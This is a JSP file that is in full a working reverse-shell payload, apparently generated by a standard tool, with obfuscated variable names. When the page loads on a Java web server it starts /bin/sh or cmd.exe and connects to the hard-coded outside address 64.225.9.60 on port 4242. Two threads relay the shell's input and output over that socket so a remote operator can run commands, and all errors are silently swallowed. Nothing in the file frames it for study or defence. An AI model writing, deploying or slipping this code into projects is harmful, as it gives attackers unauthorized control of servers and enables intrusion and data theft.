<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ud;
    OutputStream aL;

    StreamConnector( InputStream ud, OutputStream aL )
    {
      this.ud = ud;
      this.aL = aL;
    }

    public void run()
    {
      BufferedReader vK  = null;
      BufferedWriter qfV = null;
      try
      {
        vK  = new BufferedReader( new InputStreamReader( this.ud ) );
        qfV = new BufferedWriter( new OutputStreamWriter( this.aL ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = vK.read( buffer, 0, buffer.length ) ) > 0 )
        {
          qfV.write( buffer, 0, length );
          qfV.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( vK != null )
          vK.close();
        if( qfV != null )
          qfV.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "64.225.9.60", 4242 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
